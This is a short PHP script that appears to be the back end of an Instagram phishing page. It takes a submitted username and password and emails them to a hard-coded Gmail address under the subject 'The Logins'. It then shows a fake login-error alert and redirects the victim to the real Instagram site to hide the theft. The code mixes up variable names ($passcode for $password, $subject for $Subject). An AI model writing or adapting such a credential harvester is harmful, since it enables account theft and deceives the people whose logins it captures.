<?php

//Variable settings
$username = $_POST['u_name'] ?? ''; // Fetch username (using null coalescing operator)
$password = $_POST['pass'] ??  '';  // Fetch password (using null caolescing operator)

$Subject = "The Logins";
$to = "pussidave@gmail.com";

$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) Username (break) (ii) password;

//Check input fields
if (!empty($username) and !empty($passcode)) {

    mail($to, $subject, $txt);
    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
        window.location.replace('https://www.instagram.com');
        </script>";

} else {

    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
        window.history.go(-1);
        </script>";
}
?>
